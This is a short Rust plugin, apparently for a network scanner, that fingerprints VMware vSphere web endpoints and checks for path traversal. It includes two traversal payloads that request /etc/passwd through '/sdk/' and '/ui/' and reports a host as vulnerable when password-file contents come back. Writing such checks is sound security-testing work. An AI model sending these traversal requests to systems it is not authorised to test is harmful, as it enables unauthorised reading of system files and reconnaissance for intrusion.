/* http-vmware-path-vuln - probe VMware web paths and traversal */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let paths = [
        "/sdk/", "/sdk/vimService.wsdl", "/sdk/vimService.wsdl?wsdl",
        "/vpx/", "/ui/", "/folder/", "/sdk/../../../../etc/passwd",
        "/ui/../../../../etc/passwd",
    ];
    let mut out = String::new();
    let mut found = 0usize;
    if !valid(ctx) { return 1; }
    for path in paths.iter() {
        let resp = match http_request(ctx, "GET", path, None, "", "", None, 8192) {
            Some(r) if !r.is_empty() => r,
            _ => continue,
        };
        let code = http_status(&resp);
        let body = http_body(&resp);
        if body.contains("root:x:") || body.contains("daemon:x:") {
            set_out(ctx, &format!("VULNERABLE: VMware path traversal at {}", path));
            return 0;
        }
        if code != 404 && (contains_ci(body, "vmware")
            || contains_ci(body, "vimService") || contains_ci(body, "vSphere"))
        {
            if found == 0 { out.push_str("VMware paths: "); } else { out.push_str(", "); }
            out.push_str(&format!("{} [{}]", path, code));
            found += 1;
        }
    }
    if found == 0 { set_out(ctx, "VMware path vulnerability: not detected"); }
    else { set_out(ctx, &out); }
    0
}
